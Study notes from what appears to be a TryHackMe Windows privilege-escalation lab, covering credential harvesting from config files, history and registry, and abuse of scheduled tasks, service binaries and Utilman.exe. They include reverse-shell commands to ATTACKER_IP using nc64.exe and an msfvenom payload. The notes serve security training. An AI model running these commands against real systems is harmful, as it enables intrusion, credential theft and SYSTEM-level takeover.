# Privilege Escalation 
## Password Harvesting from usual spots
### Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
 - C:\Unattend.xml
 - C:\Windows\Panther\Unattend.xml
 - C:\Windows\Panther\Unattend\Unattend.xml
 - C:\Windows\system32\sysprep.inf
 - C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

**Note:** The command above will only work from `cmd.exe`, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with `$Env:userprofile`. 

### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
`cmdkey /list`
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
`runas /savecred /user:admin cmd.exe`

### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:
`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

`schtasks /query /tn vulntask /fo list /v`
You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`
`icacls c:\tasks\schtask.bat` 
result: ``` c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)```
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
` echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

enable listener on attacker machine 
`nc -lvp 4444`
Now, run the scheduled task on the target (windows) machine and you will get the reverse shell 

you can use `msiexec /quiet /qn /i C:\Windows\Temp\<malicious_file>.msi` to execute any file in windows.

## Abusing Service misconfiguration 
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:
`sc qc <service_name>`

### Insecure Permissions on Service Executable
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
` sc qc WindowsScheduler`

Methodolgy: 
1. create a payload using msfvenom
    ` msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o rev-svc.exe `
2. host the python server using `python3 -m http.server`
3. In the Target machine, `wget http://<host_ip>:port/filename -O output_file_name.exe`
4. go to  `cd C:\PROGRA~2\SYSTEM~1\` -> `move WService.exe WService.exe.bak`
5. Now, move the payload to the WService.exe using `move C:\path\to\payload.exe WService.exe`
6. Give Full permission to the file `icacls WService.exe /grant Everyone:F`
7. run the listener in the attacker machine `nc -lvnp 4445`
8. then stop and start the `windowsscheduler`, `sc stop windowsscheduler` and `sc start windowsscheduler` you will get the reverse shell if it is executed successfully.

### Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `C:\Program Files\RealVNC\VNC Server\vncserver.exe`, followed by the given parameters:
`sc qc "vncserver"`
**
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.**

## Abusing the files for privileged access
1. `takeown /f C:\Windows\System32\Utilman.exe`
2. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
3. `copy cmd.exe utilman.exe`
4. log out of the account and click on `ease of access` option on lock screen, if it works then you will get access to the `nt authority/system` shell

## Abusing vulnerable software 
### Unpatched Software
Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
`wmic product get name,version,vendor`
